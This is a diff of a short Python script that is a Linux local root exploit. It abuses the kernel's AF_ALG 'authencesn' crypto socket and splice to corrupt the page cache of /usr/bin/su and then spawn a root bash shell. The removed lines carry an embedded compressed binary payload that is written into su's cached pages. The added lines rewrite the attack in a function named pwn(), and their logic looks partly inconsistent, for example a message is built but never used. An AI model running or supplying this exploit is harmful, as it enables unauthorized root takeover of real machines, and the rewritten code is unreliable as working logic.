@@ -1,10 +1,34 @@
 #!/usr/bin/env python3
-import os as g,zlib,socket as s
-def d(x):return bytes.fromhex(x)
-def c(f,t,c):
- a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
- try:u.recv(8+t)
- except:0
-f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
-while i<len(e):c(f,i,e[i:i+4]);i+=4
-g.system("su")
+import os,ctypes,struct,socket,sys
+from ctypes import c_int,c_ulong
+
+SOL_ALG=279;AF_ALG=38
+PAGE=4096;SU=b"/usr/bin/su"
+
+def make_alg(typ,name,feat=0,mask=0):
+    s=socket.socket(AF_ALG,socket.SOCK_SEQPACKET,0)
+    s.bind(struct.pack("16sHHI64s",typ,feat,mask,0,name))
+    return s
+
+def splice(fd_in,fd_out,n):
+    NR=275
+    return ctypes.CDLL(None,use_errno=True).syscall(NR,fd_in,None,fd_out,None,n,0)
+
+def pwn():
+    aead=make_alg(b"aead",b"authencesn(hmac(sha1),cbc(aes))")
+    aead.setsockopt(SOL_ALG,4,16)
+    aead.setsockopt(SOL_ALG,2,b"\x00"*36)
+    aead.setsockopt(SOL_ALG,3,b"\x00"*16)
+    op,_=aead.accept()
+    tfd=os.open(SU.decode(),os.O_RDONLY)
+    pfd=os.pipe()
+    splice(tfd,pfd[1],PAGE)
+    # corrupt page cache
+    iv=b"\x00"*16
+    msg=struct.pack("II",2,len(iv))+iv
+    op.sendmsg([b"\x00"*28],[( socket.SOL_SOCKET,socket.SCM_RIGHTS,struct.pack("i",pfd[1]))])
+    op.sendmsg([b"\x00"*(16+20+4)],[])
+    os.read(pfd[0],4)
+    os.execlp("su","su","-c","id;exec bash")
+
+pwn()
